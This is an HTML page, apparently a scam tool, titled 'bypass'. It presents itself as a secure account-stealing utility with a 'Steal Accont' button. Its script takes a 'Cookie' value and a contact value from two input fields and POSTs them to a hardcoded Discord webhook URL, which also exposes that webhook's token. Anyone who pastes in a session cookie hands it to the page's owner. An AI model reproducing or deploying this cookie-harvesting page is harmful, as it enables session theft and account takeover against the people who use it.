<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>bypass</title>

  <style>
    :root{
      --bg:#0b0f1a;
      --muted:#8b93b6;
      --text:#e5e7ff;
      --blue:#4f5dff;
      --blue-2:#3b47ff;
      --line:#1c2350;
    }

    *{
      box-sizing:border-box;
      font-family:Inter,system-ui,Segoe UI,Roboto,Arial,sans-serif;
    }

    body{
      margin:0;
      min-height:100vh;
      display:grid;
      place-items:center;
      background:radial-gradient(1200px 600px at 50% -10%,#12183a,transparent 60%),var(--bg);
      color:var(--text);
    }

    .wrap{width:min(420px,92vw)}

    .hero{
      display:grid;
      place-items:center;
      margin-bottom:14px;
    }

    .shield{
      width:74px;
      height:74px;
      border-radius:50%;
      display:grid;
      place-items:center;
      background:radial-gradient(circle at 30% 30%,#6a74ff,#3b47ff);
      box-shadow:0 20px 60px rgba(79,93,255,.45);
    }

    .shield svg{
      width:38px;
      height:38px;
      fill:#fff;
    }

    h1{
      margin:12px 0 4px;
      font-size:28px;
      text-align:center;
    }

    .sub{
      color:var(--muted);
      text-align:center;
      font-size:14px;
    }

    .card{
      background:linear-gradient(180deg,#0f1533,#0c1126);
      border:1px solid var(--line);
      border-radius:18px;
      box-shadow:0 30px 80px rgba(0,0,0,.6);
      padding:18px 16px 20px;
      margin-top:18px;
    }

    .field{margin:12px 0}

    .field label{
      display:block;
      font-size:13px;
      color:#c7cbff;
      margin-bottom:6px;
    }

    .field input{
      width:100%;
      padding:13px 14px;
      border-radius:12px;
      background:#0b1026;
      border:1px solid var(--line);
      color:var(--text);
      outline:none;
    }

    .field input::placeholder{
      color:#6f77a8;
    }

    .field input:focus{
      border-color:#4f5dff;
      box-shadow:0 0 0 4px rgba(79,93,255,.25);
    }

    .btn{
      width:100%;
      margin-top:14px;
      padding:14px 16px;
      border:none;
      border-radius:14px;
      background:linear-gradient(180deg,var(--blue),var(--blue-2));
      color:#fff;
      font-weight:700;
      font-size:16px;
      cursor:pointer;
    }

    .btn:active{
      transform:translateY(1px);
    }

    .foot{
      margin-top:10px;
      text-align:center;
      font-size:12px;
      color:#7d85c9;
    }
  </style>
</head>

<body>
  <div class="wrap">
    <div class="hero">
      <div class="shield">
        <svg viewBox="0 0 24 24">
          <path d="M12 2 4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3zm-1.1 14.1-3-3 1.4-1.4 1.6 1.6 4.2-4.2 1.4 1.4-5.6 5.6z"/>
        </svg>
      </div>
      <h1>bypass</h1>
      <div class="sub">Secure automation with real-time bypassing</div>
    </div>

    <div class="card">
      <div class="field">
        <label>Cookie &lt;&gt;🖨</label>
        <input id="chat1" type="text" placeholder="Cookie &lt;&gt;🖨">
      </div>

      <div class="field">
        <label>Contat🌎</label>
        <input id="chat2" type="text" placeholder="Contat🌎">
      </div>

      <button class="btn" id="sendBtn">Steal Accont</button>
      <div class="foot">Secure • Automated • Real-time</div>
    </div>
  </div>

  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1460455302087311381/0W6Ht0jSw743zKiwTWmjg0MoaDhTTQyHlmxrpDuirJZuE4PnW2VcKhPGX1qx1qkg9bFB";

    document.getElementById("sendBtn").addEventListener("click", async () => {
      const chat1 = document.getElementById("chat1").value.trim();
      const chat2 = document.getElementById("chat2").value.trim();

      if (!chat1 && !chat2) {
        alert("Digite algo nos campos.");
        return;
      }

      const payload = {
        content: `**bypass**
**Cookie <>🖨:** ${chat1 || "-"}
**Contat🌎:** ${chat2 || "-"}`
      };

      try {
        const res = await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (res.ok) {
          alert("Steal success✔️!");
          document.getElementById("chat1").value = "";
          document.getElementById("chat2").value = "";
        } else {
          alert("Falha ao enviar.");
        }
      } catch (e) {
        alert("Erro de conexão.");
      }
    });
  </script>
</body>
</html>
